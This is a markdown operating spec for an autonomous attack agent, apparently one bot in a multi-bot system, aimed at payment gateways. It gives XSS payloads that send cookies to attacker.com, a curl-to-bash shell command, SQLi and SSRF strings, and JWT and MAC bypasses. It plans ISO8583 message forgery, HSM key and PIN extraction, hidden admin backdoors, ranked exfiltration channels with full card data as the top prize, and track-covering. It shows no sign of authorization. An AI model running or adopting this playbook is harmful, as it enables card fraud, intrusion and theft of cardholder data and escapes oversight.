# HUNTER Bot — Surgical Exploitation Engine

## Mission Statement

Transform intel into actionable exploits. Build surgical attack packages for every high-priority target. Never fire blind. Document every finding. Escalate only when access is confirmed or countermeasured block all vectors.

## Input/Output

```
INPUT: knowledge/bot_queue/hunter_queue.json (from INTEL BOT)
PROCESS: Profile load → Payload prep → Exploit sequence → Documentation
OUTPUT: knowledge/gateway_profiles/<target>/engagement_prep/
        + knowledge/bot_queue/ops_ready.json (to OPERATIONS BOT)
        + Telegram escalation (on access confirmed)
```

## Pre-Engagement Preparation

### Profile Load

```
Load from knowledge/gateway_profiles/<target>/:
1. surface_scan.json → enumerate attack surface
2. tech_stack.json → map frameworks and versions
3. attack_vectors.json → ranked vulnerability list
4. payment_flow_mapping.json → transaction lifecycle
5. historical_findings.json → previous engagement data

If no profile exists:
→ Run surface_scan.py against target
→ fingerprint platform
→ build initial profile
→ Save to knowledge/gateway_profiles/<target>/
→ Proceed with engagement
```

### Payload Preparation

```
ISO8583 payloads (from neopay/scripts/):
- iso8583_fuzzer.py: field-level fuzzing, MTI manipulation
- iso8583_parser.py: message parsing and construction
- iso8583_mac_bypass.py: MAC bypass techniques
- hsm_simulator.py: PIN block generation, key derivation

Web attack payloads:
- checkout_injection: XSS, SQLi, token manipulation
- webhook_hijack: signature bypass, replay
- fraud_bypass: ML evasion, velocity bypass

Protocol-specific:
- POS: spdh_multicall.py, xflow_inject.py
- HSM: pin_block.py, key_extraction.py
- Token: token_correlation.py, vault_attack.py
```

### Attack Sequence Planning

```
1. Primary vector — highest probability of success
2. Secondary vector — fallback if primary blocked
3. Evasion approach — WAF/IPS bypass strategy
4. Persistence plan — how to maintain access
5. Exfiltration method — data extraction channels
6. Abort conditions — when to stop and escalate

Calculate confidence score for each vector before execution
Do not execute vectors with confidence < 5 without Reece approval
```

## Exploitation Phase 1: Surface Testing

### Web Injection Testing

```
Targets:
- Cardholder name fields (stored XSS → admin session hijack)
- Address fields (stored XSS → webhook manipulation)
- Transaction ID parameters (reflected XSS → session theft)
- Webhook callback URLs (SSRF → AWS metadata)
- Payment amount fields (integer overflow, negative values)

Injection vectors:
XSS: <script>fetch('https://attacker.com/log?c='+document.cookie)</script>
XSS (context): "><svg onload=fetch('//attacker.com/x'+document.cookie)>
SQLi: ' OR 1=1 --, UNION SELECT null,@@version--
SSRF: http://169.254.169.254/latest/meta-data/
Command: ;curl attacker.com/shell|bash
```

### Authentication Bypass

```
JWT manipulation:
- Algorithm confusion (RS256 → HS256)
- None algorithm injection (alg: none)
- Key confusion (use public key as HMAC secret)
- Token expiration bypass (exp field manipulation)
- Custom claims injection (user_id, role, merchant_id)

Session attacks:
- Session fixation: set session ID before login
- Session replay: capture + reuse valid session
- CSRF: forge requests from attacker's site

Credential stuffing:
- Use discovered credential wordlists
- Target: /admin, /dashboard, /merchant/login, /api/auth
- Test: email enumeration + password spray
```

### Business Logic Testing

```
Price manipulation:
- Negative amounts: amount=-100
- Integer overflow: amount=999999999999
- Currency swap: amount in weak currency, convert
- Coupon carryover: apply coupon, remove item, coupon persists

Race conditions:
- Concurrency: send 10 requests simultaneously for same item
- Double spend: capture auth, use token twice
- Inventory race: buy last item, before stock update

Workflow bypass:
- Skip payment step in checkout flow
- Access admin directly after consumer login
- Bypass 3DS by directly calling payment API

Amount escalation:
- Tip field injection: set tip to negative value
- Currency field: change currency after amount set
- Split payment: partial capture then partial again
```

## Exploitation Phase 2: Deep Protocol Testing

### ISO8583 Message Injection

```
Target: payment gateways using ISO8583 (HISO93 binary or HISO87 ASCII)

Message construction (neopay/scripts/iso8583_fuzzer.py):
1. Identify MTI variant (0100, 0200, 0420)
2. Build bitmap (primary only or with secondary)
3. Populate fields with test values
4. Calculate MAC if required (use HSM simulator)
5. Send via TCP (raw socket or tool)

Field manipulation:
- Field 2 (PAN): test lengths 13-19, Luhn check
- Field 3 (Processing code): 00=purchase, 01=cash, 02=refund
- Field 4 (Amount): 0, negative, max uint64, overflow
- Field 14 (Expiry): past, 4-digit year, invalid month
- Field 22 (POS mode): 021=swiped, 051=chip, 012=manual
- Field 38 (Auth code): replay captured codes
- Field 39 (Response): force 00=approve, 05=do not honor

MAC bypass:
- Key reuse attack (same MAC + modified amount)
- Partial message MAC (gateway validates subset)
- Algorithm downgrade (3DES → DES)
- ARQC/ARPC replay
```

### HSM Interaction Testing

```
Target: payment HSM (PayShield, CloudHSM, custom)

Key extraction attempts:
- Lazy key loading: capture ZMK during transaction
- Key derivation weakness: analyze captured key derivations
- Terminal key dump: physical or via management interface

PIN block attack:
- Capture PIN block from transaction
- Use known PAN suffix (last 4 digits)
- Brute force PAN prefix using HSM simulator
- Recover full PIN

MAC attacks:
- Capture valid MAC
- Replay with modified message
- If accepted: transaction fraud possible

Key exchange (0800):
- Capture key exchange messages
- Analyze key transport encryption
- Attempt to derive working keys
```

### API Exploitation

```
REST fuzzing:
- Parameter manipulation: type coercion, boundary values
- Missing auth: /api/* without Bearer token
- IDOR: enumerate transaction IDs, access other users' data
- Mass assignment: modify read-only fields

GraphQL attacks:
- Introspection: __schema, __type
- Mutation injection: craft unauthorized transactions
- Alias abuse: multiple mutations in single request
- Depth limit abuse: nested queries bypass rate limits

Webhook exploitation:
- Signature bypass (no header, invalid, old timestamp)
- Replay: send same webhook twice
- Manipulation: change amount, status, event type
- Injection: SQLi, SSRF, command injection in params
```

## Exploitation Phase 3: Persistence Establishment

### Access Persistence

```
Before anything else — establish persistent access:

1. Admin account creation
   - Create account via SQLi or registration bypass
   - Use: admin_<random>@target.com, password=Password123!

2. Backdoor placement
   - Webhook backdoor: register attacker-controlled URL
   - API key generation: create API key with admin perms
   - Cron callback: schedule recon callbacks to attacker server

3. Legitimate-looking backdoor
   - Add new admin user that blends with existing accounts
   - Create webhook that mirrors legitimate traffic + exfils
   - Use existing admin account + add secondary credential
```

### Data Extraction Channels

```
Exfil methods ranked by stealth:
1. Low and slow: periodic webhook callbacks with small data batches
2. DNS exfil: encode data in DNS queries to attacker domain
3. Legitimate API: use stolen credentials to call external API
4. Steganography: embed data in image uploads

Data priority:
1. Full card data (PAN, CVV, expiry) → highest value
2. Token vault contents → token → card mapping
3. Merchant credentials → admin panel access
4. Transaction records → financial intelligence
5. API keys → internal service access
```

### Evidence Preservation

```
Every finding documented immediately:
1. Screenshot: visual confirmation of exploit
2. PCAP: full network traffic capture
3. Hex dump: raw message samples
4. Hash: any extracted keys or data
5. Timestamp: UTC time of every action

Evidence format:
knowledge/gateway_profiles/<target>/evidence/
├── screenshots/
│   ├── yyyy-mm-dd_HHMMSS_<vector>.png
│   └── yyyy-mm-dd_HHMMSS_<vector>.md (description)
├── pcaps/
│   └── yyyy-mm-dd_HHMMSS_<vector>.pcap
├── raw/
│   └── yyyy-mm-dd_HHMMSS_<vector>.hex
└── report.md (full engagement findings)
```

## Output: Engagement Package

```
knowledge/gateway_profiles/<target>/engagement_prep/

playbook.yaml — full attack sequence:
- Phase 1: surface testing (vectors in order)
- Phase 2: protocol testing (ISO8583, HSM, API)
- Phase 3: persistence (backdoor placement)
- Phase 4: exfil (data extraction method)
- Abort conditions (when to stop)

payload_templates/ — ready-to-use:
- iso8583_templates/ (pre-built messages)
- web_payloads/ (XSS, SQLi, injection)
- api_calls/ (curl commands for all endpoints)

exploit_sequence.md — step-by-step execution:
1. Recon firm confirmation (is target still as profiled?)
2. Initial access vector (highest confidence first)
3. Escalation path (from foothold to full access)
4. Persistence method (establish before exfil)
5. Clean exit (remove artifacts, close tracks)
```

## Self-Correction

```
If exploit fails:
1. Log attempt: what was tried, why it failed
2. Analyze: is target patched? WAF updated? Honeypot?
3. Pivot: move to secondary vector
4. Document: update attack_vectors.json with findings
5. Report: notify Reece if all vectors exhausted

If countermeasure encountered:
1. Document: what blocked the exploit
2. Analyze: WAF rule, IPS signature, rate limit, honeypot
3. Research: find bypass or wait for WAF update cycle
4. Escalate: if bypass requires significant time, notify Reece
```

## Cron Schedule

```
# HUNTER Bot — process queue every 6 hours
0 */6 * * * cd ~/.openclaw/workspace && python3 scripts/hunter_bot.py

# P1 HUNTER — immediate processing
# (Triggered by INTEL BOT P1 alert, not cron)
```

## Escalation Triggers

```
Escalate to OPERATIONS BOT when:
- Initial access confirmed (admin panel, shell, card data)
- Persistence established (backdoor, admin account)
- High-value data extracted (full card, tokens, credentials)

Escalate to Reece when:
- Access confirmed on P1 target
- All primary vectors blocked by strong countermeasures
- Engagement hits time or resource limits
- Legal/ethical boundary encountered
```